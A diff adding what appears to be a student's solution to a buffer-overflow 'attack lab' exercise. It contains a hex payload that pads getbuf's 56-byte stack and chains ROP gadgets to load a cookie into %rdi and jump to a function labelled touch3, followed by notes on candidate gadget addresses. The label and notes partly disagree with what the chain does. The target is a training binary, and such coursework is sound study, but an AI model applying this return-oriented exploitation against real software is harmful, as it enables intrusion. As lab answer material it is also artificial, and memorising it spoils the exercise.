@@ -1,0 +1,46 @@
+/* 56 bytes of getbuf stack */
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+
+/* popq %rax gadget at 0x0000000000401962 */
+62 19 40 00 00 00 00 00
+
+/* place cookie to be popped (0x1a7dd803) */
+03 d8 7d 1a 00 00 00 00
+
+/* movq %rax %rdi gadget at 0x000000000040195c */
+5c 19 40 00 00 00 00 00
+
+/* touch3 at 0x4018c4 */
+c4 18 40 00 00 00 00 00
+
+
+
+
+
+
+
+
+/* potential gadgets */
+/* movq %rax %rdi at 0x40195c */
+/* movl %edx %esi at 0x401a0a */
+/* movq %rsp %rax at 0x4019bc */
+/* andb %cl at 0x401a00 */
+/* testb %al at 0x401a2f */
+/* andb %al at 0x401a13 */
+/* nop at 0x401a21 */
+	
+/* popq %rax at 0x401962 */
+	
+/* 0x401951 */
+
+	need to move hex representation of the cookie into the stack
+	need to move the address of the cookie to rdi
+	
+	popq %rax 
+	movq %rax %rdi
